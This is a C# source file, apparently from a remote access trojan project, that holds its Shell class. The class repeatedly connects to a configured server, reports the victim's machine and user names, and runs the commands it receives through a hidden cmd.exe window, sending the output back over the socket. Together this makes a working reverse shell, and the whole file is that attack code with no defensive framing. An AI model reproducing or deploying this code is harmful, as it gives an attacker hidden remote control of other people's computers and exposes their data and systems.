using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Linq;
using System.Net;
using System.Net.Sockets;
using System.Text;
using System.Threading;
using Company.Tools.RemoteAccessTrojan.Domain.Seedwork;
using Company.Tools.RemoteAccessTrojan.Infrastructure.CrossCutting;

namespace Company.Tools.RemoteAccessTrojan.Domain.Models
{
    public class Shell
    {
        #region Instances

        private Dictionary<SocketWrapper, Process> _processes;

        #endregion

        #region Properties

        public bool IsExiting { get; set; }
        public bool IsConnectionInProgress { get; set; }

        #endregion

        #region Methods

        #region Constructors

        internal Shell()
        {
            this._processes = new Dictionary<SocketWrapper, Process>();
        }

        #endregion

        #region Exposed

        internal void ReachServer()
        {
            while (!this.IsExiting)
            {
                if (this.IsConnectionInProgress)
                {
                    Thread.Sleep(Config.Current.PollInterval);
                }
                else
                {
                    this.IsConnectionInProgress = true;
                    var thread = new Thread(this.Communication_Open);
                    thread.Start();
                }
            }
            foreach (var process in this._processes)
            {
                process.Key.Close();
                process.Value.Close();
            }
        }

        #endregion

        #region Communication

        private void Communication_Open()
        {
            var socket = new SocketWrapper(new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp));

            try
            {
                socket.Connect(new IPEndPoint(IPAddress.Parse(Config.Current.IpAddress), Config.Current.ListenPort));

                this.Communication_IdentifySelf(socket);
                this.Communication_Begin(socket);
            }
            catch (SocketException) // Server not running
            {
                this.IsConnectionInProgress = false;
            }
        }

        private void Communication_IdentifySelf(SocketWrapper socket)
        {
            socket.WriteString(string.Format(@"{0}\{1}", Environment.MachineName, Environment.UserName));
        }

        private void Communication_Begin(SocketWrapper socket)
        {
            var stop = false;
            while (!stop)
            {
                var command = socket.ReadString();

                switch (command)
                {
                    case Connection.STOP:
                        stop = true;
                        socket.Close(false);
                        this.IsConnectionInProgress = false;
                        break;
                    case Connection.EXIT:
                        stop = true;
                        this.IsExiting = true;
                        break;
                    default:
                        this.Execute(socket, command);
                        break;
                }
            }
        }

        #endregion

        #region Execution

        private void Execute(SocketWrapper socket, string command)
        {
            if (!this._processes.ContainsKey(socket))
            {
                this._processes.Add(socket, this.CreateProcess());
            }

            var process = this._processes[socket];
            process.StandardInput.WriteLine(command);

            socket.WaitForEof(500);
        }

        private Process CreateProcess()
        {
            var info = new ProcessStartInfo()
            {
                WorkingDirectory = @"C:\Windows\System32",
                FileName = @"C:\Windows\System32\cmd.exe",
                WindowStyle = ProcessWindowStyle.Hidden,
                UseShellExecute = false,
                RedirectStandardInput = true,
                RedirectStandardOutput = true
            };

            var process = new Process()
            {
                StartInfo = info
            };

            process.OutputDataReceived += new DataReceivedEventHandler(this.Process_OutputDataReceived);
            process.Start();
            process.BeginOutputReadLine();

            return process;
        }

        #endregion

        #region Handlers

        private void Process_OutputDataReceived(object sender, DataReceivedEventArgs e)
        {
            var process = (Process)sender;
            var socket = this._processes.Where(x => x.Value == process)
                                        .Select(x => x.Key)
                                        .Single();
            socket.WriteString(string.Format("{0}{1}", e.Data, Environment.NewLine), false);
        }

        #endregion

        #endregion
    }
}